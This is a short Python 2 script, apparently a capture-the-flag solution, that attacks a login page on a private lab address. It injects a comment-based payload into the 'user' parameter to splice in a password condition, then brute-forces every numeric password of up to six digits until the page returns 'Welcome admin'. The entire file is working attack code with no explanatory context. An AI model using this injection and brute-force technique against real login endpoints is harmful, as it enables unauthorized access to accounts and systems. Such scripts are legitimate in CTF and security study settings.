import requests
#http://192.168.1.3/inctfj/2/?user=""/*foo*/||/*foo*/pw="*&pass=*/
url="http://192.168.1.3/inctfj/2/?user=""/*foo*/||/*foo*/pw=\""
pay="1234567890"
passwd=""
passw = [ ]
for current in xrange(6):
	a = [i for i in pay]
	for y in xrange(current):
		a = [x+i for i in pay for x in a]
	passw = passw+a


for i in passw:
	query=url+i+"\"/*&pass=*/"
	http=requests.get(query)
	if "Welcome admin" in http.text:
		print i
		exit()




